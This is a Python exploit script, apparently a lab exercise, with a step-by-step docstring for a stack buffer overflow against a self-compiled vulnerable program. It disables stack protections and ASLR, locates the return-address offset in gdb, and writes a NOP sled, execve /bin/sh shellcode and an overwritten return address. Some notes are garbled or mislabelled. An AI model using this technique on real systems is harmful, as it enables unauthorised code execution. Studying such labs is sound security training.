"""
1) first of all we need to compile the c program 

gcc -m64 -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0 -o vuln
vuln.c
    - -fno-stack-protector disables canaries
    - -z execstack allows executable code to be run inside the stack (NX bit off)
    - -m64 specifies the architecture (64-bit in this case)

    

2) see which security measure is putted over the binary file with
    chceksec vuln
    PIE is enabled but we will disable asrl on our machine at all


3) disable the ASRL on our machine because otherwise it will not work
    sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'



now we need to find the number of bytes we need to reach the rsp (equal to EIP)

4) gdb vuln 
5) disass main -> to see which function it will call-> we see that it calls greet_me
5.1) disass greet_me -> we can see that there is strcpy that is vulnerable



6) pattern create 350 -> we create a pattern in gdb of 350 chars

7) b main -> to put a break point on the main 

8) run "created pattern"

9) disass greet_me -> to see the address of ret in the function greet_me ()

10) b *ret_address

11) c -> to continue to the ret_address breakpoint, here we can see which string is in rsp

12) pattern search "string found in rsp" -> we get the number of bytes we need to reach the rsp and overwrite it

"""
import sys

#from point we know we have 216 bytes
nops=b'\x90'*40

#we add padding because in some cases the payload needs to put something in the stack, so if we don't have padding
#then it will overwrite it self
padding = b'\x55'*40

#found on https://shell-storm.org/shellcode/files/shellcode-806.html (not this one, this one is another one)
payload = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

# it is used to set the address on which the executiong will go
# in this case we will put the address of a nop slide

#rip_address = b'A'*8
#we found x909090... on 0x7fffffffe228 so we need to revert it and add 2 null bytes to reach 8 bytes
rip_address=b'\x28\xe2\xff\xff\xff\x7f\x00\x00'

buffer = b'\x55'*(216 -len(nops)-len(padding)-len(payload)-len(rip_address))



sys.stdout.buffer.write(buffer+nops+payload+padding+rip_address)
